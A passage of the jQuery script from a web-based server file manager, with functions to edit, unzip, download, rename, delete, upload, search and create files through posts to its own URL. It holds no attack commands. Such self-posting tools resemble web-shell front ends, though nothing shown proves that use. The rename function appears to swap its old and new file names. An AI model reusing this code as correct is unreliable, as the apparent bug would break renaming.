			$(".loading").show(1000);
			$(".editor").empty();
			$.post(fName(),
			 {file: file},
			 function(data) {
				$(".loading").hide(1000);
			 	$(".editor").removeClass('hidden');
			 	$(".editor").append(data);
		 		colorcoding();
			});
		}
		function crossfm()
		{
			$(".navbar-toggle").click();
			$(".explorer").addClass('hidden');
			$(".apps").removeClass('hidden');
		}
		function cancelfileinfo()
		{
			$(".fileinfo").addClass('hidden');
		}
		function openeditora(c)
		{
			$(".fileinfo").addClass('hidden');
			openfile(c);
		}
		function openzipa(k,o)
		{
			$(".fileinfo").addClass('hidden');
			openzip(k,o);
		}
		function openzip(l,n)
		{
			var path = l
			var zip = l+"/"+n;
			$(".loading").show(1000);
			$.post(fName(),
			 {zip: zip},
			 function(data)
			 {
				$(".loading").hide(1000);
			 	if (data==1)
			 	{
			 		changedir(path+"/.");
					$(".zip-success").show(1000);
					setTimeout(function(){
						$(".zip-success").hide(1000);
					},2000);
			 	}
			 	else if (data==2)
			 	{
					$(".zip-error").show(1000);
					setTimeout(function(){
						$(".zip-error").hide(1000);
					},2000);
			 	}
			});
		}
		function showinfo(d,e)
		{
			$(d).removeClass('hidden');
		}
		function download(f)
		{
			$(".fileinfo").addClass('hidden');
			var win = window.open(fName()+'?downfile='+f, '_blank');
			if (win) 
			{
				win.focus();
			}
			else
			{
				alert('Please Allow Pop Ups for this site and then Try again.')
			}
		}
		function hiderename()
		{
			$(".rename").addClass('hidden');
		}
		function hidedelete()
		{
			$(".confirm-delete").addClass('hidden');
		}
		function rename(g,h)
		{
			$(".rename").removeClass('hidden');
			$(".fileinfo").addClass('hidden');
			$(".oldname").text(h);
			$(".path").text(g);
		}
		function renamefile()
		{
			$(".rename").addClass('hidden');
			var oldname = $(".path").text()+"/"+$(".newname").text();
			var newname = $(".path").text()+"/"+$(".oldname").text();
			$(".loading").show(1000);
			$.post(fName(),
			 {oldname: oldname,newname:newname},
			 function(data) {
			 	if(data==1)
			 	{
					$(".loading").hide(1000);
			 		changedir($(".path").text()+"/.");
			 		$(".rename-success").show(1000);
			 		setTimeout(function() {
			 		$(".rename-success").hide(1000);
			 		}, 2000);
			 		$(".newname").text("");
			 	}
			 	if (data==2) 
			 	{
					$(".loading").hide(1000);
			 		$(".rename-error").show(1000);
			 		setTimeout(function() {
			 			$(".rename-error").hide(1000);
			 		}, 2000);
			 	}
			});
		}
		function confirm_delete(j,m)
		{
			$(".confirm-delete").removeClass('hidden');
			$(".fileinfo").addClass('hidden');
			$(".filepath1").text(j);
			$(".filepath2").text(m);
		}
		function deletefile()
		{
			$(".confirm-delete").addClass('hidden');
			var path = $(".filepath1").text();
			var deletefile = path+"/"+$(".filepath2").text();
			$(".loading").show(1000);
			$.post(fName(),
			 {deletefile: deletefile},
			 function(data) {
			 	if(data==1)
			 	{
			 		changedir(path+"/.");
			 		$(".delete-success").show(1000);
			 		setTimeout(function() {
			 		$(".delete-success").hide(1000);
			 		}, 2000);
			 	}
			 	if (data==2) 
			 	{
			 		$(".delete-error").show(1000);
			 		setTimeout(function() {
			 			$(".delete-error").hide(1000);
			 		}, 2000);
			 	}
			});
		}
		$(function()
		{
			$(".filemanager").on("click",function(){
				$(".apps").addClass("hidden");
				$(".explorer").removeClass("hidden");
			});
		});
		function startTime() {
		    var today = new Date();
		    var h = today.getHours();
		    var m = today.getMinutes();
		    m = checkTime(m);
		     if (h>12) 
		    {
		    	h-=12;
		    	var t = "PM &nbsp;";
		    }
		    else
		    	var t = "AM &nbsp;";
		    document.getElementById('txt').innerHTML =
		    h + ":" + m + " " + t;
		    var t = setTimeout(startTime, 500);
		}
		function checkTime(i) {
		    if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
		    return i;
		}
		function properties(p)
		{
			var file = p;
			cancelfileinfo();
			$.post(fName(),
				{properties:file},
				function(data){
					$(".explorer").append(data);
				});
		}
		function cancelproperty()
		{
			$(".fileproperty").remove();
		}
		function showAddFile(q)
		{
			$(".navbar-toggle").click();
			$(".add-files").removeClass('hidden');
			$(".add-file-path").text(q);
		}
		function addFiles(){
			var data = new FormData();
			if ($('.input-group')[0].files.length==0)
			{
				alert("Please Choose Any File");
				return false;
			}
			jQuery.each($('.input-group')[0].files, function(i, file) 
			{
    			data.append('file-'+i, file);
			});
			data.append('path',$(".add-file-path").text());
					jQuery.ajax({
			    url: fName(),
			    data: data,
			    cache: false,
			    contentType: false,
			    processData: false,
			    method: 'POST',
			    type: 'POST', // For jQuery < 1.9
			    success: function(data){
			    	if (data==$('.input-group')[0].files.length)
			    	{
				    	changedir($(".add-file-path").text()+'/.');
				    	$(".input-group").filestyle('clear');
				    	closeAddFile();
			    	}
			    	alert(data);
			    }
			});
		}
		function closeAddFile()
		{
			$(".add-files").addClass('hidden');
			$(".input-group").filestyle('clear');
		}
		$(".input-group").filestyle({
			buttonText : ' Choose files from System', 
			buttonName : 'btn-info'
		});
 		function infopro()
 		{
 			$(".tableinfo").removeClass('hidden');
 			$(".tableperm").addClass('hidden');
 		}
 		function permpro()
 		{
 			$(".tableinfo").addClass('hidden');
 			$(".tableperm").removeClass('hidden');
 		}
 		function deleteMulti(s)
 		{
 			$(".navbar-toggle").click();
 			$(".foldermore").addClass('hidden');
 			$(".deletefiles").removeClass('hidden');
 			$(".deleteMulti").addClass('hidden');
 			var options = '<li onclick="deleteMultiConfirm()" class="deleteMultiConfirm"><a><span class="fa fa-unlink"></span> DELETE</a></li><li onclick="deleteMultiReject()" class="deleteMultiReject"><a><span class="fa fa-remove"></span> Cancel Delete</a></li>';
 			$(".navbar-nav").append(options);
 		}
 		function deleteMultiReject(){
 			$(".deleteMultiConfirm").remove();
 			$(".deleteMultiReject").remove();
 			$(".navbar-toggle").click();
	        $('.deletefiles:checked').attr("checked",false);
 			$(".foldermore").removeClass('hidden');
 			$(".deletefiles").addClass('hidden');
 			$(".deleteMulti").removeClass('hidden');
 		}
 		function deleteMultiConfirm()
 		{
 			var path = $(".deleteMultiPath0").text();
	        $('.deletefiles:checked').each(function(i){
		          $.post(fName(),
					 {deletefile: $(this).val()},
					 function(data) {
					 	if(data==1)
					 	{
					 		$(".delete-success").show(1000);
					 		setTimeout(function() {
					 		$(".delete-success").hide(1000);
					 		}, 2000);
					 	}
					 	if (data==2) 
					 	{
					 		$(".delete-error").show(1000);
					 		setTimeout(function() {
					 			$(".delete-error").hide(1000);
					 		}, 2000);
							$(this).attr("checked",false);
					 	}
					 });
	      		setTimeout(function()
	      		{
					changedir(path+"/.");
				},1000);
	        });
	    }
 		function gotohome(r)
 		{
 			changedir(r);
 		}
 		function searchfile()
 		{
 			if ($(".searchInput").val().length==0)
 			{
 				alert("Please Write Something")
 			}
 			$(".clearSearch").remove();
 			var option = '<li onclick="clearSearch()" class="clearSearch"><a><span class="fa fa-remove"></span> Exit Searching</a></li>';
 			$(".navbar-nav").append(option);
 			$(".WithoutSearching").addClass('hidden');
 			$(".searchExplorer").remove();
 			$.post(fName(),
 				{search: $(".searchInput").val(),searchPath: $(".deleteMultiPath0").text()},
 				function(data) {
 				$(".explorer").append(data);
 			});
 		}
 		function clearSearch()
 		{
 			$(".WithoutSearching").removeClass('hidden');
 			$(".searchExplorer").remove();
 			$(".searchInput").val("");
 			$(".clearSearch").remove();
 		}
 		function Confirm_newFile(s)
 		{
 			$(".navbar-toggle").click();
 			$(".newFile-panel").removeClass("hidden");
 			$(".newFilePath").text(s);
 		}
 		function Confirm_newFolder(t)
 		{
 			$(".navbar-toggle").click();
 			$(".newFolder-panel").removeClass("hidden");
 			$(".newFolderPath").text(t);
 		}
 		function hideNewFile()
 		{
 			$(".newFile-panel").addClass("hidden");
 		}
 		function hidenewFolder()
 		{
 			$(".newFolder-panel").addClass("hidden");
 		}
 		function newFile()
 		{
 			var newFilePath = $(".newFilePath").text();
 			var newFile = $(".newFile").text();
 			$(".loading").show(1000);
 			$.post(fName(),
 				{newFilePath: newFilePath,newFile: newFile},
 				function(data) {
 				if(data==1)
			 	{
			 		$(".newFile-success").show(1000);
			 		setTimeout(function() {
			 		$(".newFile-success").hide(1000);
			 		}, 2000);
 					changedir(newFilePath+"/.");
 					$(".newFile").text("");
			 	}
			 	if (data==2) 
			 	{
			 		$(".newFile-error").show(1000);
			 		setTimeout(function() {
			 			$(".newFile-error").hide(1000);
			 		}, 2000);
			 	}
 				$(".newFile-panel").addClass("hidden");
 			});
 		}
 		function newFolder()
 		{
 			var newFolderPath = $(".newFolderPath").text();
 			var newFolder= $(".newFolder").text();
 			$(".loading").show(1000);
 			$.post(fName(),
 				{newFolderPath: newFolderPath,newFolder: newFolder},
 				function(data) {
 				if(data==1)
			 	{
			 		$(".newFolder-success").show(1000);
			 		setTimeout(function() {
			 		$(".newFolder-success").hide(1000);
			 		}, 2000);
 					changedir(newFolderPath+"/.");
 					$(".newFolder").text("");
			 	}
			 	if (data==2) 
			 	{
			 		$(".newFolder-error").show(1000);
			 		setTimeout(function() {
			 			$(".newFolder-error").hide(1000);
			 		}, 2000);
			 	}
 				$(".newFolder-panel").addClass("hidden");
 			});
 		}
</script>
  </body>
</html>
